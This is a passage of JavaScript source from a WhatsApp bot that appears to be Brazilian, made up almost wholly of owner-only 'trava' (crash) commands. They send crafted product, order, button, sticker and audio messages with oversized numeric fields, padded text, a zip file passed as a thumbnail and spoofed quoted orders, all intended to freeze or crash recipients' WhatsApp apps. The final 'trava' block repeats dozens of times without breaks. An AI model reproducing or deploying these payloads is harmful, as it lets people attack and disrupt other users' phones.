pl.sendMessage(from, { text: `Tchau ${pushname} üòá`}, { quoted: selo} )
break

case 'catalogo':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
var tod = await reSize(`./fun√ß√µes de cmd/m√≠dia-ft-vd/fotos/akame.jpg`, 200, 200) 
var messa = await prepareWAMessageMedia({ image: tod}, { upload: pl.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `${listbug}`,
"description": `${buttonkal}\n${loc}`,
"footerText": `¬© _Copyright by Yuri Modz__`,
"currencyCode": "IDR",
"priceAmount1000": "999999999999999999999999999999999",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Akame-MD`,
"url": `zap zap travadoü§£Ô∏è`
},
"businessOwnerJid": `5565993065507@s.whatsapp.net`,
}
}), { userJid: from, quoted: selo })
pl.relayMessage(from, catalog.message, { messageId: catalog.key.id })
break

case 'carrinho': { 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
var messa = await prepareWAMessageMedia({ image:  { url: 'https://telegra.ph/file/cf640249a841ff0e62c85.jpg' }}, { upload: pl.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {"orderId": "449756950375071","orderImage": thumb,"itemCount": 100000000000,"status": "INQUIRY","message": `KiLL  üíñ  iNFiNiTO   üíñ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`,
 "thumbnail": fs.readFileSync(`./src/travas/name.zip`), "surface": "CATALOG","orderTitle": `¬© copyright by Yuri Modz`,"sellerJid": "6285723156229@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000", "totalCurrencyCode": "IDR",
}
}), { userJid: pl.user.id, quoted: selo })
pl.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break

case 'carrinho2': { 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
var messa = await prepareWAMessageMedia({ image:  { url: 'https://telegra.ph/file/cf640249a841ff0e62c85.jpg' }}, { upload: pl.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {"orderId": "449756950375071","orderImage": thumb,"itemCount": 100000000000,"status": "INQUIRY","message": `${azrarel}`,
 "thumbnail": fs.readFileSync(`./src/travas/name.zip`), "surface": "CATALOG","orderTitle": `¬© copyright by Yuri Modz`,"sellerJid": "6285723156229@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000", "totalCurrencyCode": "IDR",
}
}), { userJid: pl.user.id, quoted: selo })
pl.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break

case 'buttoncrash':
addFilter(from)  
if(!SoDono) return reply(enviar.msg.donosmt)
let buttonbugg = [
{buttonId: `crashed</>`, buttonText: {displayText: `${buttonkal}\n${travavideo}`}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: `${buttonkal}\n${travavideo}`}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: `${buttonkal}\n${travavideo}`}, type: 1}]
let selocrrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '‚ùîü§£', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let buttonbug = {
text: `üòàùòæùôßùôñùô®ùôùùôñùô£ùôôùô§ ùôèùô™ùôôùô§üòà`,
footer: 'üî•ùôä ùôàùôöùô°ùôùùô§ùôß ùòøùôñ ùòºùô©ùô™ùôñùô°ùôûùôôùôñùôôùôöüî•',
buttons: buttonbugg,
headerType: 2}
pl.sendMessage(m.chat, buttonbug, {quoted: selocrrash})
break

case 'buttonbug': {
addFilter(from)  
if(!SoDono) return reply(enviar.msg.donosmt)
let buttonbuugg = [
{buttonId: `crashed</>`, buttonText: {displayText: `${home}\n${travavideo}`}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: `${home}\n${travavideo}`}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: `${home}\n${travavideo}`}, type: 1}]
let buttonbuug = {
text: `üòàùôèùôßùôñùô´ùôñùô£ùôôùô§ ùôèùô™ùôôùô§üòà`,
footer: 'üî•ùôä ùôàùôöùô°ùôùùô§ùôß ùòøùôñ ùòºùô©ùô™ùôñùô°ùôûùôôùôñùôôùôöüî•',
buttons: buttonbuugg,
headerType: 2}
pl.sendMessage(m.chat, buttonbuug, {quoted: selo})
}
break

case 'aud': case 'travaaudio': { 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '‚ùîü§£', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
pl.sendMessage(m.chat, {audio: fs.readFileSync("./src/travas/trava.mp3"), mimetype: 'audio/mp4'}, {quoted: audcrash})
}
break

case 'figucrash': 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(from, {sticker: fs.readFileSync('./src/travas/zap.webp') 
},{quoted: {
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "0@g.us"
},
"message": {
orderMessage: {
itemCount: 99999999,
status: 20000000000000000,
thumbnail: null,
surface: 20000000000000000000000000000,
message: " ùôôùôöùôßùôßùô™ùôóùôñùô£ùôôùô§ ùô®ùôöùô™ ùôØùôûùô• ùôØùôñùô•", 
orderTitle: '',
sellerJid: '0@g.us'
}}, 
contextInfo: {
"forwardingScore":999999,
"isForwarded": true
},
sendEphemeral: true
}})
break

case 'murian':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${murian}`}, {quoted: selo})
break

case 'funeral':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${funeral}`}, {quoted: selo})
break

case 'lugia':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${lugia}`}, {quoted: selo})
break

case 'pv3':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${pv3}`}, {quoted: selo})
break

case 'explosion':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${explosion}`}, {quoted: selo})
break

case 'jamaicano':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${jamaicano}`}, {quoted: selo})
break

case 'malvadinha':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${malvadinha}`}, {quoted: selo})
break

case 'spanking':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${spanking}`}, {quoted: selo})
break

case 'cova':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${cova}`}, {quoted: selo})
break

case 'killed':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${killed}`}, {quoted: selo})
break

case 'sumiu':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${sumiu}`}, {quoted: selo})
break

case 'carrinho1':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${carrinho}`}, {quoted: selo})
break

case 'carrinhodesc':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${carrinhodesc}`}, {quoted: selo})
break

case 'carrinhofake':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${carrinhofake}`}, {quoted: selo})
break

case 'catalogo2':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${catalogo}`}, {quoted: selo})
break

case 'catalogodesc':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${catalogodesc}`}, {quoted: selo})
break

case 'convite1':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${convite}`}, {quoted: selo})
break

case 'doc':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${doc}`}, {quoted: selo})
break

case 'pdf':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${pdf}`}, {quoted: selo})
break

case 'pdfkill':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${pdfkill}`}, {quoted: selo})
break

case 'telapreta':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${telapreta}`}, {quoted: selo})
break

case 'pdff':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${pdff}`}, {quoted: selo})
break

case 'ngazap':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
pl.sendMessage(m.chat, {text: `${ngazap}`}, {quoted: selo})
break

//========FIM DAS TRAVAS=============\\

//========ESPECIAL=============\\

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
